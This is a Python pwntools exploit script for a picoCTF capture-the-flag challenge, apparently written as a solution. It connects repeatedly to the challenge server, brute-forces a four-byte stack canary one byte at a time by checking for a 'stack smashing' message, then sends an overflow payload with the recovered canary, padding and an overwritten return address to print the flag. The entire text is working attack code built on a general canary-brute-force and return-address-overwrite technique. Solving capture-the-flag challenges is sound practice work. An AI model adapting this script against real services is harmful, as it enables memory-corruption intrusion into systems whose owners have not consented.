from pwn import *

host = 'saturn.picoctf.net'
port = 62183
canary = ''
payload = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' #Used to overflow our buffer
payload_end = 'BBBBBBBBBBBBBBBB'


def exploit(canary):
	try:
		connect = remote(host,port)
		connect.sendlineafter(b'> ', str(200).encode()) #Sets our buffer size to 200 for the first input
		connect.sendlineafter(b'Input> ', (payload + canary + payload_end).encode() + p32(0x08049336)) #Sends our payload + found canary + padding and finally the address we want to access
		output = connect.recvall()
		print(f'FLAG => ' + str(output[28:71])) #Prints out the flag
		exit()
	except Exception as e:
		print(e)
		exit()
### Brute forcing the canary starts ###
print('[+] Connecting...')
print('[+] Bruting Canary...')
with context.quiet:
	for n in range(1,5):
		for i in range(256):
			connect = remote(host,port)

			connect.sendlineafter(b'> ', str(64 + n).encode()) #Sets the buffer to 64
			connect.sendlineafter(b'Input> ', (payload + canary + chr(i)).encode()) #Sends our payload + characters to brute force canary

			output = connect.recvall()

			if b'Smashing' not in output: #Detects if "Smashing" is in the output, if it isn't, the character will be added to our canary variable
				canary += chr(i)
				print(f'[+] Character Found => ' + canary)
				if len(canary) == 4: #Checks to see if the canary is 4 characters long
					print('[+] Canary Found => ' + canary)
					exploit(canary) #Passes the canary to the final exploit function
				else:
					break
